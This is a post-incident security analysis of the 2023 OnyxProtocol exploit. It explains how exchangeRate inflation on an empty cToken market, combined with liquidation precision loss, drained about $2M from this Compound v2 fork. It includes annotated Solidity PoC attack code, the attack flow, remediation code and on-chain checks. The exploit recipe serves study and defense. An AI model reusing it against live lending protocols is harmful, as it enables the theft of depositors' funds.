# OnyxProtocol — ERC4626 Inflation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-11-01 |
| **Protocol** | OnyxProtocol |
| **Chain** | Ethereum |
| **Loss** | $2,000,000 (~822 WETH) |
| **Attacker** | [0x085b...2bff](https://etherscan.io/address/0x085bdff2c522e8637d4154039db8746bb8642bff) |
| **Attack Contract** | [0x526e...36f](https://etherscan.io/address/0x526e8e98356194b64eae4c2d443cc8aad367336f) |
| **Attack Tx** | [0xf7c2...f635](https://etherscan.io/tx/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635) |
| **Vulnerable Contract** | [0x5fdb...1750 (oPEPE)](https://etherscan.io/address/0x5fdbcd61bc9bd4b6d3fd1f49a5d253165ea11750) |
| **Root Cause** | Artificially inflating the exchangeRate via direct donation to an empty cToken market in a Compound v2 fork, then exploiting precision loss to evade debt collateralization |
| **Attack Block** | 18,476,513 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/OnyxProtocol_exp.sol) |

---

## 1. Vulnerability Overview

OnyxProtocol is a decentralized lending protocol forked from Compound v2. This attack combined an **ERC4626-style Inflation Attack** with **Precision Loss**, exploiting a structural flaw common to Compound v2 forks.

### Two Core Vulnerabilities

**1. exchangeRate Manipulation on an Empty Market**

Compound v2's cToken computes `exchangeRate` using the following formula:

```
exchangeRate = (totalCash + totalBorrows - totalReserves) / totalSupply
```

When the cToken supply (`totalSupply`) is extremely small (just 2), directly transferring (`transfer`) the underlying asset inflates only the numerator (`totalCash`) explosively, causing `exchangeRate` to spike abnormally. This formula does not account for direct transfers and is therefore vulnerable to manipulation.

**2. Precision Loss in `liquidateCalculateSeizeTokens`**

`liquidateCalculateSeizeTokens`, which calculates the number of cTokens to seize during liquidation, computes the following:

```
seizeTokens = repayAmount × liquidationIncentive × priceBorrowed / (priceCollateral × exchangeRate)
```

When `exchangeRate` is extremely high, the denominator grows so large that `seizeTokens` becomes 0 or a very small value under Solidity integer division. The attacker exploits this precision loss in reverse: using the formula `mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2`, they re-mint **slightly fewer** oPEPE tokens than the liquidator (themselves) would seize, ensuring their cToken balance after liquidation offsets the loss from the liquidation.

The combination of these two mechanisms allowed the attacker to borrow liquidity from other markets without collateral.

---

## 2. Vulnerable Code Analysis

### 2.1 exchangeRate Calculation — Direct Donation Vulnerability

```solidity
// [Compound v2 CToken.sol] — Vulnerable exchangeRate calculation
function exchangeRateStoredInternal() internal view returns (uint) {
    uint _totalSupply = totalSupply;
    if (_totalSupply == 0) {
        // ❌ Initial state: returns a fixed initial value
        return initialExchangeRateMantissa;
    } else {
        // ❌ totalCash is based on the contract's actual token balance
        // → A direct transfer() increases only totalCash, causing rate to spike
        uint totalCash = getCashPrior();   // ERC20.balanceOf(address(this))
        uint cashPlusBorrowsMinusReserves = totalCash + totalBorrows - totalReserves;
        uint exchangeRate = cashPlusBorrowsMinusReserves * expScale / _totalSupply;
        return exchangeRate;
    }
}

// ❌ getCashPrior(): uses raw ERC20 balance
function getCashPrior() internal view virtual returns (uint) {
    return EIP20Interface(underlying).balanceOf(address(this));
    // → Direct transfer increases balance → rate spikes
}
```

```solidity
// ✅ Fixed code — uses internal accounting variable
uint256 private _trackedBalance; // updated only on mint/redeem/borrow/repay

function getCashPrior() internal view virtual returns (uint) {
    // Direct transfers are not reflected in _trackedBalance, so manipulation is impossible
    return _trackedBalance;
}
```

**Problem**: Because `getCashPrior()` directly uses `ERC20.balanceOf(address(this))`, a direct `transfer()` that bypasses protocol functions is also reflected in `totalCash`. When a large donation occurs while `totalSupply` is 2, `exchangeRate` rises by billions of times.

---

### 2.2 `liquidateCalculateSeizeTokens` — Precision Loss

```solidity
// [Compound v2 Comptroller.sol] — Vulnerable seized token calculation
function liquidateCalculateSeizeTokens(
    address cTokenBorrowed,
    address cTokenCollateral,
    uint actualRepayAmount
) external view override returns (uint, uint) {
    // ...
    // ❌ When exchangeRate is extremely large, the denominator explodes
    //    → precision loss: seizeTokens converges to 0
    Exp memory numerator = mul_(Exp({mantissa: liquidationIncentiveMantissa}), priceBorrowed);
    Exp memory denominator = mul_(Exp({mantissa: exchangeRateMantissa}), priceCollateral);
    Exp memory ratio = div_(numerator, denominator);
    uint seizeTokens = mul_ScalarTruncate(ratio, actualRepayAmount);
    // ❌ If seizeTokens is 0 or very small, liquidation ends with negligible collateral seizure
    return (NO_ERROR, seizeTokens);
}
```

**Problem**: When attempting liquidation with an extremely small amount like `repayAmount = 1 wei`, the manipulated high `exchangeRate` causes `seizeTokens` to become 0 or abnormally small. The attacker pre-calculates this value and re-mints (`mint`) exactly that amount of oPEPE balance, preserving the tokens that would be seized during liquidation.

---

### 2.3 Core Attack Formula in the Intermediate Contract

```solidity
// IntermediateContractToken.sol — Core attack logic
function start(ICErc20Delegate onyxToken) external {
    PEPE.approve(address(oPEPE), type(uint256).max);

    // Step 1: Mint minimum cTokens (1e18 PEPE → ~5e27 oPEPE)
    oPEPE.mint(1e18);

    // Step 2: Redeem nearly all oPEPE → only totalSupply = 2 remains
    oPEPE.redeem(oPEPE.totalSupply() - 2);
    uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;

    // Step 3: ❌ Core attack — directly transfer (donate) PEPE to oPEPE
    // With totalSupply=2, a massive PEPE balance → exchangeRate explodes
    PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

    // Step 4: Register oPEPE as collateral
    address[] memory oTokens = new address[](1);
    oTokens[0] = address(oPEPE);
    Unitroller.enterMarkets(oTokens);

    // Step 5: ❌ Borrow full balance using over-valued collateral via manipulated exchangeRate
    onyxToken.borrow(onyxToken.getCash() - 1);

    // Step 6: Transfer tokens to the main attack contract
    IERC20(onyxToken.underlying()).transfer(msg.sender, ...);

    // Step 7: Recover a portion of the underlying asset
    oPEPE.redeemUnderlying(redeemAmt);

    // Step 8: ❌ Precision loss calculation
    // Calculate the number of oPEPE the liquidator (main contract) will seize
    (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
    (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(
        address(onyxToken), address(oPEPE), 1
    );
    // ❌ precision loss: (massive exchangeRate / 1e18) * small numSeizeTokens - 2
    uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;

    // Step 9: Re-mint oPEPE — position to preserve balance after liquidation
    oPEPE.mint(mintAmount);
    PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (0x085b...) deploys the attack contract (0x526e...)
- Pre-attack ETH balance: ~4.73 ETH (for gas costs)
- No separate approval or whitelist registration required

### 3.2 Execution Phase

**[Step 1]** Obtain 4,000 WETH via AaveV3 flash loan

**[Step 2]** Swap 4,000 WETH → PEPE (Uniswap V2 PEPE/WETH pool)  
→ Acquire ~2.52 × 10³⁰ PEPE (exploiting PEPE's extremely low unit price)

**[Step 3]** Deploy `IntermediateContractETH` → Attack oETHER market:
- Mint oPEPE with 1e18 PEPE → obtain ~5e27 oPEPE
- `redeem(totalSupply - 2)` → leave only 2 oPEPE
- Directly transfer all held PEPE to the oPEPE contract (donation)
  → exchangeRate: `200000000` (initial) → rises by **billions of times**
- `enterMarkets([oPEPE])` → register over-valued oPEPE as collateral
- `oETHER.borrow(getCash() - 1)` → borrow all ETH (334 ETH) in the market
- Transfer ETH to attack contract and convert to WETH
- `redeemUnderlying(redeemAmt)` → recover a portion of underlying PEPE
- Pre-calculate `liquidateCalculateSeizeTokens(oETHER, oPEPE, 1)`
- `oPEPE.mint(mintAmount)` → re-mint to preserve balance after liquidation

**[Step 4]** Main contract liquidates intermediateETH with **0.000000000000000001 ETH (1 wei)**  
→ Call `oPEPE.liquidateBorrow{value: 1 wei}(intermediateETH, oPEPE)`  
→ Precision loss causes very few oPEPE to be seized → effectively only ETH is taken

**[Step 5]** `oPEPE.redeem(remaining oPEPE)` → recover remaining PEPE

**[Steps 6–11]** Repeat the same pattern across 6 additional markets:
- oUSDC → 279 WETH profit
- oUSDT → 137 WETH profit
- oPAXG → 84 WETH profit
- oDAI → 56 WETH profit
- oBTC → 222 WETH profit
- oLINK → 56 WETH profit

**[Step 12]** Swap remaining PEPE → WETH (recover 3,990 WETH)

**[Step 13]** Repay AaveV3 4,002 WETH (principal + fee)

### 3.3 Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker (0x085b...)                          │
│                         │                                       │
│                         ▼                                       │
│           ┌─────────────────────────┐                          │
│           │   AaveV3 Flash Loan     │                          │
│           │   Borrow 4,000 WETH     │                          │
│           └───────────┬─────────────┘                          │
│                       │ 4,000 WETH                             │
│                       ▼                                        │
│           ┌─────────────────────────┐                          │
│           │  Uniswap V2 Swap        │                          │
│           │  WETH → PEPE            │                          │
│           │  (~2.52e30 PEPE gained) │                          │
│           └───────────┬─────────────┘                          │
│                       │ All PEPE                               │
│                       ▼                                        │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │            IntermediateContract (newly deployed)         │   │
│  │                                                         │   │
│  │  1. oPEPE.mint(1e18 PEPE)                              │   │
│  │     → ~5e27 oPEPE obtained                              │   │
│  │                                                         │   │
│  │  2. oPEPE.redeem(totalSupply - 2)                      │   │
│  │     → only 2 oPEPE remain (totalSupply = 2)            │   │
│  │                                                         │   │
│  │  3. PEPE.transfer(oPEPE, full balance) ← ❌ Core vuln  │   │
│  │     → oPEPE.totalCash explodes                          │   │
│  │     → exchangeRate = totalCash / 2 → astronomical rise  │   │
│  │                                                         │   │
│  │  4. enterMarkets([oPEPE])                               │   │
│  │     → register over-valued oPEPE as collateral          │   │
│  │                                                         │   │
│  │  5. oTOKEN.borrow(getCash() - 1) ← ❌ abuse over-collat│   │
│  │     → borrow all liquidity in the market                │   │
│  │                                                         │   │
│  │  6. Transfer tokens → attack contract                   │   │
│  │                                                         │   │
│  │  7. oPEPE.redeemUnderlying(redeemAmt)                  │   │
│  │                                                         │   │
│  │  8. liquidateCalculateSeizeTokens(oTOKEN, oPEPE, 1)   │   │
│  │     → seizeTokens ≈ 0 (precision loss) ← ❌ 2nd vuln   │   │
│  │                                                         │   │
│  │  9. oPEPE.mint((exchangeRate/1e18)*seize - 2)          │   │
│  │     → position to preserve balance after liquidation    │   │
│  └─────────────────────────────────────────────────────────┘   │
│                       │                                        │
│                       ▼                                        │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │  Main contract liquidates IntermediateContract           │   │
│  │  liquidateBorrow(intermediate, 1 wei, oPEPE)           │   │
│  │  → precision loss → seized oPEPE ≈ 0                   │   │
│  │  → effectively obtain ETH/tokens for free               │   │
│  └─────────────────────────────────────────────────────────┘   │
│                       │                                        │
│             ┌─────────┴────────────────────────────┐          │
│             │  Same pattern × 6 more markets        │          │
│             │  oUSDC, oUSDT, oPAXG, oDAI, oBTC, oLINK│        │
│             └─────────┬────────────────────────────┘          │
│                       │ Stolen tokens                          │
│                       ▼                                        │
│           ┌─────────────────────────┐                          │
│           │  Uniswap V2 Reverse Swap│                          │
│           │  Each token → WETH      │                          │
│           │  Total ~4,824 WETH      │                          │
│           └───────────┬─────────────┘                          │
│                       │                                        │
│                       ▼                                        │
│           ┌─────────────────────────┐                          │
│           │  AaveV3 Repayment       │                          │
│           │  Return 4,002 WETH      │                          │
│           └───────────┬─────────────┘                          │
│                       │                                        │
│                       ▼                                        │
│           ┌─────────────────────────┐                          │
│           │  Net Profit: ~822 WETH  │                          │
│           │  ≈ $2,000,000           │                          │
│           └─────────────────────────┘                          │
└─────────────────────────────────────────────────────────────────┘
```

### 3.4 Results

| Item | Value |
|------|------|
| Flash loan size | 4,000 WETH |
| Total WETH recovered | ~4,824 WETH |
| Flash loan repayment | 4,002 WETH |
| **Net profit** | **~822 WETH (~$2,000,000)** |
| Attacker ETH before attack | 4.73 ETH |
| Attacker ETH after attack | 1,164.54 ETH |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Core attack logic — IntermediateContractToken.start()]
function start(ICErc20Delegate onyxToken) external {
    PEPE.approve(address(oPEPE), type(uint256).max);

    // [Step 1] Mint minimum cTokens
    oPEPE.mint(1e18);

    // [Step 2] Redeem nearly all cTokens → achieve totalSupply = 2
    oPEPE.redeem(oPEPE.totalSupply() - 2);
    uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;

    // [Step 3] ❌ Exploit core vulnerability: spike exchangeRate via direct donation
    // Transfer massive amount with totalSupply = 2
    // exchangeRate = (totalCash + borrows - reserves) / totalSupply
    //              → numerator explodes, denominator = 2 → ratio rises astronomically
    PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));

    // [Step 4] Register over-valued oPEPE as collateral
    address[] memory oTokens = new address[](1);
    oTokens[0] = address(oPEPE);
    Unitroller.enterMarkets(oTokens);

    // [Step 5] Collateral value assessed hundreds of times higher than actual → full borrow succeeds
    onyxToken.borrow(onyxToken.getCash() - 1);

    // [Step 6] Transfer borrowed tokens to main contract
    IERC20(onyxToken.underlying()).transfer(
        msg.sender,
        IERC20(onyxToken.underlying()).balanceOf(address(this))
    );

    // [Step 7] Recover underlying asset
    oPEPE.redeemUnderlying(redeemAmt);

    // [Step 8] ❌ Precision loss calculation
    // Pre-calculate the number of oPEPE that will be seized during liquidation
    (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
    (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(
        address(onyxToken),
        address(oPEPE),
        1  // maximize precision loss with 1 wei repayment
    );

    // [Step 9] Re-mint only (seized amount - 2)
    // → finely calibrated so oPEPE balance does not go negative after liquidation
    uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
    oPEPE.mint(mintAmount);

    // [Step 10] Return remaining PEPE to main contract
    PEPE.transfer(msg.sender, PEPE.balanceOf(address(this)));
}

// [Main contract — exploitToken()]
function exploitToken(ICErc20Delegate onyxToken) internal {
    // [Step A] Deploy intermediate contract and transfer PEPE
    IntermediateContractToken intermediateToken = new IntermediateContractToken();
    PEPE.transfer(address(intermediateToken), PEPE.balanceOf(address(this)));

    // [Step B] Execute borrow from intermediate contract
    intermediateToken.start(onyxToken);

    // [Step C] ❌ Liquidate with 1 wei → minimize oPEPE seizure via precision loss
    // Effectively only clears the onyxToken debt without taking oPEPE
    onyxToken.liquidateBorrow(address(intermediateToken), 1, address(oPEPE));

    // [Step D] Redeem remaining oPEPE → recover PEPE
    oPEPE.redeem(oPEPE.balanceOf(address(this)));
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | exchangeRate manipulation via direct cToken donation | CRITICAL | CWE-682 | `16_accounting_sync.md`, `05_integer_issues.md` |
| V-02 | Precision loss in liquidateCalculateSeizeTokens | CRITICAL | CWE-190 | `05_integer_issues.md` |
| V-03 | Empty market initialization vulnerability | HIGH | CWE-1284 | `17_staking_reward.md` (first depositor) |
| V-04 | Attack funding via flash loan | HIGH | CWE-284 | `02_flash_loan.md` |

### V-01: exchangeRate Manipulation via Direct cToken Donation

- **Description**: Compound v2's `getCashPrior()` uses `ERC20.balanceOf(address(this))`, so direct transfers that bypass protocol functions (mint/repay) are also reflected in `totalCash`. Performing a large donation on an empty market with `totalSupply` of 2 causes `exchangeRate = totalCash / totalSupply` to increase astronomically.
- **Impact**: The manipulated exchangeRate allows a small amount of cTokens to be recognized as enormous collateral value, enabling uncollateralized borrowing of all liquidity across other markets in the protocol.
- **Attack Conditions**: Target cToken `totalSupply` must be very small (new market or after all positions are liquidated). Sufficient underlying tokens must be held.

### V-02: Precision Loss in liquidateCalculateSeizeTokens

- **Description**: When `repayAmount = 1 wei` and `exchangeRate` is extremely high, the number of cTokens to seize (`seizeTokens`) becomes 0 or abnormally small under Solidity integer division. The attacker pre-calculates this value and re-adjusts their cToken balance to neutralize collateral loss from liquidation.
- **Impact**: The liquidator effectively repays the debt without seizing any meaningful collateral, allowing the attacker to retain the borrowed assets for free.
- **Attack Conditions**: V-01 must precede this, with exchangeRate already manipulated.

### V-03: Empty Market Initialization Vulnerability

- **Description**: A variant of the "first depositor attack" — mint a small amount into a new cToken market with `totalSupply = 0`, then redeem almost all of it to minimize `totalSupply`. This is a structural flaw common to Compound v2 forks, where the first depositor can manipulate the exchange rate.
- **Impact**: Newly added markets or markets with depleted liquidity become attack targets.
- **Attack Conditions**: Target market `totalSupply` is 0, or the attacker can minimize `totalSupply`.

### V-04: Attack Funding via Flash Loan

- **Description**: 4,000 WETH is obtained uncollateralized via AaveV3 flash loan to fund the attack (purchase PEPE). Since principal + fee is repaid after the attack concludes, a large-scale attack is possible with no capital of one's own.
- **Impact**: Lowers the barrier to entry for attackers to an extreme degree, enabling multi-million dollar attacks with virtually no personal funds.
- **Attack Conditions**: AaveV3 flash loan available, attack profit > flash loan fee.

---

## 6. Remediation Recommendations

### Immediate Actions

**[Recommendation 1] Replace `getCashPrior()` with an internal accounting variable**

```solidity
// ✅ Fix: use internally tracked balance that ignores direct transfers
uint256 private internalCash; // ❌ This variable is updated only on mint/redeem/borrow/repay

function getCashPrior() internal view virtual override returns (uint256) {
    // ✅ Use internal tracked value instead of ERC20 balance → ignores direct transfers
    return internalCash;
}

// Increase internalCash on mint, repay
function doTransferIn(address from, uint256 amount) internal virtual override returns (uint256) {
    uint256 balanceBefore = EIP20Interface(underlying).balanceOf(address(this));
    // ... transfer logic ...
    uint256 balanceAfter = EIP20Interface(underlying).balanceOf(address(this));
    uint256 actualAmount = balanceAfter - balanceBefore;
    internalCash += actualAmount; // ✅ Update internal balance
    return actualAmount;
}

// Decrease internalCash on redeem, borrow
function doTransferOut(address payable to, uint256 amount) internal virtual override {
    // ... transfer logic ...
    internalCash -= amount; // ✅ Update internal balance
}
```

**[Recommendation 2] Force-burn minimum initial liquidity (dead shares)**

```solidity
// ✅ Permanently burn minimum liquidity during market initialization
function _initializeMarket(address cToken, uint256 initialMintAmount) internal {
    // Permanently lock at least 1000 cTokens to address(0)
    // → totalSupply can never approach 0
    // → exchangeRate manipulation becomes impossible
    uint256 deadShares = 1000;
    _mint(address(0), deadShares); // ✅ Mint to burn address
}
```

**[Recommendation 3] Supply initial liquidity immediately upon adding a new market**

```solidity
// ✅ Force an initial deposit at the governance level when activating a market
function _supportMarket(CToken cToken) external returns (uint) {
    // ... existing logic ...
    // ✅ Prevent first depositor attack: protocol supplies initial liquidity directly
    require(
        IERC20(cToken.underlying()).balanceOf(address(cToken)) >= MINIMUM_INITIAL_LIQUIDITY,
        "Insufficient initial liquidity"
    );
    return NO_ERROR;
}
```

### Structural Improvements

| Vulnerability | Recommended Action | Reference Implementation |
|--------|-----------|-------------|
| V-01: exchangeRate manipulation | Replace `getCashPrior()` with internal accounting variable | Compound v3 (Comet), Aave v3 |
| V-02: Precision loss | Set minimum liquidation amount (e.g. ≥ $10) | MakerDAO liquidation minimum dust |
| V-03: Empty market | Enforce minimum liquidity + dead shares on market activation | Uniswap v2 MINIMUM_LIQUIDITY |
| V-04: Flash loan abuse | Restrict or delay mint-borrow combinations within a single block | EIP-3156 flash loan reentrancy guard |

---

## 7. Lessons Learned

### 7.1 Comparison with Similar Cases: Common Factors with Hundred Finance and Sonne Finance

The OnyxProtocol attack is one in a series of attacks exploiting a **structural flaw unique to Compound v2 forks**.

| Protocol | Date | Loss | Attack Method | Common Factor |
|----------|------|------|-----------|--------|
| **Hundred Finance** | 2023-04 | $7M | ERC4626 donation attack | Empty market + exchangeRate manipulation |
| **Sonne Finance** | 2024-05 | $20M | ERC4626 inflation attack | Same pattern, exploited on new market addition |
| **OnyxProtocol** | 2023-11 | $2M | Same pattern + precision loss | Variant of known attack pattern |

All three protocols:
1. Forked the Compound v2 codebase as-is
2. Did not patch the `balanceOf` dependency in `getCashPrior()`
3. Lacked initial liquidity protection measures when adding new markets

### 7.2 General Lessons

1. **Security audit is mandatory on forks**: Known vulnerability patterns in base protocols (Compound, Aave, etc.) must be patched when forking. Deploying open-source code as-is inherits publicly known vulnerabilities.

2. **Strengthen new market addition procedures**: When adding a new cToken market, minimum initial liquidity supply and dead shares configuration must be included in governance proposals. Adopting Uniswap v2's `MINIMUM_LIQUIDITY` pattern (burning 1000 units) is recommended.

3. **Separate internal accounting from external balances**: Using ERC20 `balanceOf` as the accounting basis is vulnerable to donation attacks. An internal tracking variable (`internalCash`) must be maintained separately to ignore direct transfers. Compound v3 (Comet) is an example of this improvement.

4. **Set minimum liquidation amounts**: Dust-level liquidation attempts like `repayAmount = 1 wei` can cause precision loss. A minimum liquidation amount must be enforced, similar to MakerDAO's `dust` parameter.

5. **Beware of reuse of known attack patterns**: Seven months after the Hundred Finance attack, and before the Sonne Finance attack, the same pattern was reused. Proactive code review and patch application for known attack vectors is critical.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| Flash loan WETH | 4,000 WETH | 4,000 WETH | ✅ |
| oPEPE initial exchangeRate | 200000000 (2e8) | 200000000 | ✅ |
| oETHER getCash before attack | ~334 ETH | 334,476,442,580,295,733,161 wei (~334 ETH) | ✅ |
| oUSDC getCash before attack | ~514K USDC | 513,987,927,005 (~514K USDC) | ✅ |
| Total WETH recovered | ~4,824 WETH | ~4,824 WETH (sum of logs) | ✅ |
| Aave repayment | 4,002 WETH | 4,002 WETH | ✅ |
| Net profit | ~$2M | ~822 WETH (~$2M, ETH at $2,440 at the time) | ✅ |

### 8.2 On-Chain Event Log Sequence

A total of 354 event logs were emitted; the core flow is as follows:

1. AaveV3 → Attack contract: 4,000 WETH Transfer
2. Attack contract → PEPE/WETH pool: 4,000 WETH Transfer (swap)
3. PEPE/WETH pool → Attack contract: ~2.52e30 PEPE Transfer
4. Attack contract → IntermediateContract: PEPE Transfer
5. IntermediateContract → oPEPE: 1e18 PEPE Transfer (mint)
6. oPEPE → IntermediateContract: ~5e27 oPEPE Transfer
7. IntermediateContract → oPEPE: ~5e27 oPEPE Transfer (redeem, 2 remaining)
8. oPEPE → IntermediateContract: PEPE Transfer (redemption)
9. **IntermediateContract → oPEPE: ~2.52e30 PEPE Transfer (core donation)**
10. IntermediateContract → Attack contract: ETH Transfer (loan proceeds)
11. Attack contract → IntermediateContract liquidation (1 wei)
12. (Repeat) × 6 markets
13. Attack contract → AaveV3: 4,002 WETH Transfer (repayment)

### 8.3 Precondition Verification (as of attack block 18,476,512)

| Item | Value |
|------|-----|
| oPEPE totalSupply (before attack) | 0 (new/empty market) |
| oPEPE exchangeRate (before attack) | 200,000,000 (initial value) |
| Attacker ETH balance (before attack) | 4.731 ETH |
| Attacker ETH balance (after attack) | 1,164.539 ETH |
| Attack transaction gas used | 12,713,150 gas |
| Attack gas price | 35 Gwei |

> **On-chain verification method**: Use `cast` (Foundry), RPC endpoint: `https://eth-mainnet.public.blastapi.io`